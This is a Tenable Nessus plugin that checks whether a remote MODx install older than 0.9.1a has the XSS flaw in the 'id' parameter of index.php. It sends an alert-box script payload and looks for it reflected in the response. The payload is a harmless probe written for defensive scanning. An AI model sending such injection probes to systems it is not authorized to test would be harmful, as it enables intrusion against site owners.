#
# (C) Tenable Network Security
#


if (description)
{
  script_id(21235);
  script_version("$Revision: 1.4 $");

  script_cve_id("CVE-2006-1820", "CVE-2006-1821");
  script_bugtraq_id(17532, 17533);

  script_name(english:"MODx < 0.9.1a Multiple Vulnerabilities");
  script_summary(english:"Tries to exploit a XSS flaw in MODx");

  desc = "
Synopsis :

The remote web server contains a PHP script that is susceptible to
multiple issues. 

Description :

The remote host is running MODx, a content management system written
in PHP. 

The version of MODx installed on the remote host fails to sanitize
input to the 'id' parameter of the 'index.php' script before using it
to generate dynamic HTML output.  An unauthenticated attacker can
exploit this to inject arbitrary script and HTML into a user's
browser. 

Also, the same lack of input sanitation reportedly can be leveraged to
launch directory traversal attacks against the affected application,
although exploitation may only be successful if the affected host is
running Windows and if PHP's 'magic_quotes_gpc' setting is disabled. 

See also :

http://www.securityfocus.com/archive/1/431010/30/0/threaded
http://modxcms.com/forums/index.php/topic,3982.0.html

Solution :

Upgrade to MODx version 0.9.1a or later. 

Risk factor :

Medium / CVSS Base Score : 4.6
(AV:R/AC:L/Au:NR/C:P/I:P/A:N/B:N)";
  script_description(english:desc);

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006 Tenable Network Security");

  script_dependencies("http_version.nasl", "cross_site_scripting.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("url_func.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (get_kb_item("www/"+port+"/generic_xss")) exit(0);
if (!can_host_php(port:port)) exit(0);


# A simple alert.
xss = string("<script>alert(", SCRIPT_NAME, ")</script>");


# Loop through various directories.
if (thorough_tests) dirs = make_list("/modx", cgi_dirs());
else dirs = make_list(cgi_dirs());

foreach dir (dirs)
{
  # Try to exploit the issue.
  req = http_get(
    item:string(
      dir, "/index.php?",
      "id=2", urlencode(str:xss)
    ), 
    port:port
  );
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) exit(0);

  # There's a problem if we see our XSS.
  if (string("WHERE (sc.id=2", xss, " )") >< res)
  {
    security_warning(port);
    exit(0);
  }
}
